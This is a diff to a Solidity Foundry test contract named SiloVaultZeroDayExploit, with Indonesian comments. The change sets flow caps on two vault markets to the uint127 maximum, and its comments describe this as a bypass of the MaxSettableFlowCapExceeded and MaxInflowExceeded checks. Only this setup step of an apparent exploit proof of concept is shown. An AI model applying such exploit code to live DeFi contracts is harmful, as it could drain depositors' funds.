@@ -73,11 +73,15 @@ contract SiloVaultZeroDayExploit is Test {
         vault.acceptCap(IERC4626(address(targetMarket)));
         vault.acceptCap(IERC4626(address(idleMarket)));
 
-        // [FIX 4] ATUR FLOW CAPS DENGAN BATAS uint127 (Bypass MaxSettableFlowCapExceeded)
-        FlowCapsConfig[] memory configs = new FlowCapsConfig[](1);
+        // [FIX 4] ATUR FLOW CAPS UNTUK KEDUA MARKET (Bypass MaxSettableFlowCapExceeded & MaxInflowExceeded)
+        FlowCapsConfig[] memory configs = new FlowCapsConfig[](2);
         configs[0] = FlowCapsConfig({
             market: IERC4626(address(targetMarket)),
-            caps: FlowCaps({maxIn: 170141183460469231731687303715884105727, maxOut: 10000000000}) // <--- KUNCI LOLOS VALIDASI
+            caps: FlowCaps({maxIn: 170141183460469231731687303715884105727, maxOut: 10000000000}) 
+        });
+        configs[1] = FlowCapsConfig({
+            market: IERC4626(address(idleMarket)),
+            caps: FlowCaps({maxIn: 170141183460469231731687303715884105727, maxOut: 170141183460469231731687303715884105727}) 
         });
         allocator.setFlowCaps(ISiloVault(address(vault)), configs);
 
